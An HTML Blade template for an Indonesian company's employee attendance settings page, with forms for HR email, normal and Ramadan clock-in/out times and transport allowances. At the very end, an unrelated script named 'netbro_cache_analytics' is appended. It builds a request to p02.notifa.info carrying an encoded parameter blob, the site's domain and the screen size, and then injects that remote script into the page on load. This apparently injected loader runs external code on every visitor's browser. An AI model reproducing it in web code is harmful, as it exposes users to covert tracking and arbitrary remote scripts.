<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="author" content="">

    <link rel="shortcut icon" href="/image/favicon.png">
    <title>Pengaturan Presensi</title>
    <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/jqvmap/jqvmap.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
    <!-- Toastr untuk notifikasi -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/style.css" type="text/css"/>    
</head>

<body>

  <!-- Wrapper Start   --> 
  <div class="be-wrapper">

    <!--  Sidebar Start -->  
    <div class="be-wrapper be-fixed-sidebar">
      @include('Beranda.sidebar')
    </div>
    <!--  Sidebar End --> 
    <!--   Content Start  -->
    <div class="be-content be-icons-list">
      <div class="page-head">
       <h2 class="page-head-title">Pengaturan Presensi</h2>
         <ol class="breadcrumb page-head-nav">
          <li><a href="/datakaryawan">Pengaturan Presensi</a></li>
          <li class="active">Edit Pengaturan Presensi</li>
        </ol>
      </div>

     <div class="main-content container-fluid">

      <!--  Form Pengaturan Presensi Start -->
      <form action="presensi/pengaturan_presensi/{{$pengaturan_presensi->id}}/update" method="POST" style="border-radius: 0px;" class="form-horizontal group-border-dashed">
        {{ csrf_field()}}
        <div class="panel">
          <div class="panel-heading panel-heading-divider">Email HRD</div>
            <div class="panel-body">
              <div class="form-group">
                <label class="col-sm-3 control-label">Email HRD</label>
                <div class="col-sm-6">
                  <input type="text" value="{{$pengaturan_presensi->email_hrd}}" name="email_hrd" id="email_hrd" class="form-control">
                </div>
              </div>
              <div class="form-group">
                <div class="text-right" ">
                  <button type="button" style="margin-right: 272px;" data-toggle="modal" data-target="#simpan1-{{$pengaturan_presensi->id}}" class="btn btn-primary">Simpan</button>
                    <!--  Modal Simpan1 Start-->
                    <div id="simpan1-{{$pengaturan_presensi->id}}" tabindex="-1" role="dialog" class="modal fade">
                      <div class="modal-dialog">
                        <div class="modal-content">
                          <div class="modal-header">
                            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                          </div>
                          <div class="modal-body">
                            <div class="text-center">
                              <h4>Apakah anda yakin akan menyimpan perubahan pada data tersebut ?</h4>
                              <div class="xs-mt-50">
                                <button type="submit" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                                <a href="#"><button type="submit" class="btn btn-space btn-primary">Simpan</button></a>
                              </div>
                            </div>
                          </div>
                          <div class="modal-footer"></div>
                        </div>
                      </div>
                    </div>
                    <!--  Modal Simpan1  End-->

               </div>
              </div>
            </div>
        </div>
      </form>

      <form action="presensi/pengaturan_presensi/{{$pengaturan_presensi->id}}/update" method="POST" class="form-horizontal group-border-dashed">
        {{ csrf_field()}}
        <div class="panel">
          <div class="panel-heading panel-heading-divider">Bulan Normal</div>
            <div class="panel-body">
              <div class="form-group">
                <label class="col-sm-3 control-label">Clock In Normal</label>
                <div class="col-sm-6">
                  <input type="text" value="{{$pengaturan_presensi->clock_in_normal}}" name="clock_in_normal" class="form-control">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Clock Out Normal</label>
                <div class="col-sm-6">
                  <input type="text" value="{{$pengaturan_presensi->clock_out_normal}}" name="clock_out_normal" class="form-control">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Transport Normal</label>
                <div class="col-sm-6">
                  <input type="text" value="{{$pengaturan_presensi->transport_normal}}" name="transport_normal" class="form-control">
                </div>
              </div>
              <div class="form-group">
                <div class="text-right">
                  <button type="button" style="margin-right: 272px;" data-toggle="modal" data-target="#simpan2-{{$pengaturan_presensi->id}}" class="btn btn-primary">Simpan</button>
                  <!--  Modal Simpan2 Start-->
                  <div id="simpan2-{{$pengaturan_presensi->id}}" tabindex="-1" role="dialog" class="modal fade">
                    <div class="modal-dialog">
                      <div class="modal-content">
                        <div class="modal-header">
                          <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                        </div>
                        <div class="modal-body">
                          <div class="text-center">
                            <h4>Apakah anda yakin akan menyimpan perubahan pada data tersebut ?</h4>
                            <div class="xs-mt-50">
                              <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                              <a href="#"><button type="submit" class="btn btn-space btn-primary">Simpan</button></a>
                            </div>
                          </div>
                        </div>
                        <div class="modal-footer"></div>
                      </div>
                    </div>
                  </div>
                  <!--  Modal Simpan2 End-->
               </div>
              </div>
            </div>
        </div>
      </form>

      <form action="presensi/pengaturan_presensi/{{$pengaturan_presensi->id}}/update" method="POST" class="form-horizontal group-border-dashed">
        {{ csrf_field()}}
        <div class="panel">
          <div class="panel-heading panel-heading-divider">Bulan Ramadhan</div>
            <div class="panel-body">
              <div class="form-group">
                <label class="col-sm-3 control-label">Clock In Ramadhan</label>
                <div class="col-sm-6">
                  <input type="text" value="{{$pengaturan_presensi->clock_in_ramadhan}}" name="clock_in_ramadhan" class="form-control">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Clock Out Ramadhan</label>
                <div class="col-sm-6">
                  <input type="text" value="{{$pengaturan_presensi->clock_out_ramadhan}}" name="clock_out_ramadhan" class="form-control">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Transport Ramadhan</label>
                <div class="col-sm-6">
                  <input type="text" value="{{$pengaturan_presensi->transport_ramadhan}}" name="transport_ramadhan" class="form-control">
                </div>
              </div>
              <div class="form-group">
                <div class="text-right" ">
                  <button type="button" style="margin-right: 272px;" data-toggle="modal" data-target="#simpan3-{{$pengaturan_presensi->id}}" class="btn btn-primary">Simpan</button>
                    <!--  Modal Simpan3 Start-->
                    <div id="simpan3-{{$pengaturan_presensi->id}}" tabindex="-1" role="dialog" class="modal fade">
                      <div class="modal-dialog">
                        <div class="modal-content">
                          <div class="modal-header">
                            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                          </div>
                          <div class="modal-body">
                            <div class="text-center">
                              <h4>Apakah anda yakin akan menyimpan perubahan pada data tersebut ?</h4>
                              <div class="xs-mt-50">
                                <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                                <a href="#"><button type="submit" class="btn btn-space btn-primary">Simpan</button></a>
                              </div>
                            </div>
                          </div>
                          <div class="modal-footer"></div>
                        </div>
                      </div>
                    </div>
                    <!--  Modal Simpan3 End-->
               </div>
              </div>
            </div>
        </div>
      </form>

      <form action="presensi/pengaturan_presensi/{{$pengaturan_presensi->id}}/update" method="POST" class="form-horizontal group-border-dashed">
        {{ csrf_field()}}
        <div class="panel">
          <div class="panel-heading panel-heading-divider">Lupa Clock In/Out</div>
            <div class="panel-body">
              <div class="form-group">
                <label class="col-sm-3 control-label">Lupa Clock In/Out</label>
                <div class="col-sm-6">
                  <input type="text" value="{{$pengaturan_presensi->lupa_clock_in_out}}" name="lupa_clock_in_out" class="form-control">
                </div>
              </div>
              <div class="form-group">
              <div class="text-right">
                <button type="button" style="margin-right: 272px;" data-toggle="modal" data-target="#simpan4-{{$pengaturan_presensi->id}}" class="btn btn-primary">Simpan</button>
                 <!--  Modal Simpan4 Start-->
                    <div id="simpan4-{{$pengaturan_presensi->id}}" tabindex="-1" role="dialog" class="modal fade">
                      <div class="modal-dialog">
                        <div class="modal-content">
                          <div class="modal-header">
                            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                          </div>
                          <div class="modal-body">
                            <div class="text-center">
                              <h4>Apakah anda yakin akan menyimpan perubahan pada data tersebut ?</h4>
                              <div class="xs-mt-50">
                                <button type="submit" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                                <a href="#"><button type="submit" class="btn btn-space btn-primary">Simpan</button></a>
                              </div>
                            </div>
                          </div>
                          <div class="modal-footer"></div>
                        </div>
                      </div>
                    </div>
                    <!--  Modal Simpan4  End-->
              </div>
            </div>   
          </div>      
        </div>                    
      </form>           
      <!--  Form Pengaturan Presensi End -->
  </div>
  <!--   Content End  -->

</div>
<!--  Wrapper End    -->  
     
       
 <!--Footer Start-->     
 <div class="text-center">
    <div class="credits">
      <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
    </div>
 </div>
 <!--Footer End-->  
 
<!--  Inisialisasi Java Script -->
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

<script>
        @if (Session::has('message'))
    var type = "{{Session::get('alert-type','info')}}";
    toastr.options = {
        "debug": false,
        "onclick": null,
        "fadeIn": 300,
        "fadeOut": 1000,
        "timeOut": 5000,
        "extendedTimeOut": 1000
    }

    switch(type)
    {
        case 'info':
            toastr.info("{{Session::get('message')}}");
            break;

        case 'success':
            toastr.success("{{Session::get('message')}}");
            break;

        case 'warning':
            toastr.warning("{{Session::get('message')}}");
            break;

        case 'error':
            toastr.error("{{Session::get('message')}}");
            break;
    }

    @endif

</script>
<script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="assets/js/main.js" type="text/javascript"></script>
<script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="assets/lib/jquery-flot/jquery.flot.js" type="text/javascript"></script>
<script src="assets/lib/jquery-flot/jquery.flot.pie.js" type="text/javascript"></script> 
<script src="assets/lib/jquery-flot/jquery.flot.resize.js" type="text/javascript"></script>
<script src="assets/lib/jquery-flot/plugins/jquery.flot.orderBars.js" type="text/javascript"></script>
<script src="assets/lib/jquery-flot/plugins/curvedLines.js" type="text/javascript"></script>
<script src="assets/lib/jquery.sparkline/jquery.sparkline.min.js" type="text/javascript"></script>
<script src="assets/lib/countup/countUp.min.js" type="text/javascript"></script>
<script src="assets/lib/jquery-ui/jquery-ui.min.js" type="text/javascript"></script>
<script src="assets/lib/jqvmap/jquery.vmap.min.js" type="text/javascript"></script>
<script src="assets/lib/jqvmap/maps/jquery.vmap.world.js" type="text/javascript"></script>

I<!-- inisialisasi Java Script -->

<script type="text/javascript">

// Fungsi Logout

$(function(){
    $('a#logout').click(function(){
        if(confirm('Apakah anda yakin ingin keluar ?')) {
            return true;
        }

        return false;
          });
      });


// Fungsi Menu dashboard

$(document).ready(function(){

    App.init();
    App.dashboard();

    });
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
</script>
</body>
</html>
 